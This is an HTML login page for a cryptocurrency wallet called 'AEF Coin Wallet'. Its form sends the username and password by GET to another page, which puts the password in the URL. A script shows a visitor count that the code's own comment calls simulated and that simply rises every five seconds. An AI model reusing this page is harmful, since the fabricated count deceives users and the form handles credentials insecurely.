<!DOCTYPE html>
<html>
<head>
    <title>Login - AEF Coin Wallet</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        h1 {
            color: #333;
            margin-top: 50px;
        }
        .login-content {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            width: 400px;
            margin: 0 auto;
            margin-top: 50px;
            color: #fff;
        }
        .login-form label {
            color: #fff;
            font-weight: bold;
        }
        .login-form input[type="text"],
        .login-form input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            margin-bottom: 15px;
            border: none;
            border-radius: 5px;
        }
        .login-button {
            padding: 10px 20px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-button:hover {
            background-color: #0056b3;
        }
        .countdown {
            font-size: 18px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h1>Login - AEF Coin Wallet</h1>
    
    <div class="login-content">
        <p>Please log in to your AEF Coin Wallet account.</p>
        
        <form class="login-form" action="special_message.html">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required><br><br>

            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required><br><br>

            <button type="submit" class="login-button">Login</button>
        </form>

        <div class="countdown">
            Number of People: <span id="peopleCount">50,000</span>
        </div>
    </div>

    <script>
        // Simulated people count
        const peopleCountElement = document.getElementById('peopleCount');
        let currentPeopleCount = 50000;

        function updatePeopleCount() {
            currentPeopleCount++; // Increment the count
            peopleCountElement.textContent = currentPeopleCount.toLocaleString(); // Format the count
        }

        // Update the people count initially and every 5 seconds
        updatePeopleCount();
        setInterval(updatePeopleCount, 5000);
    </script>
</body>
</html>
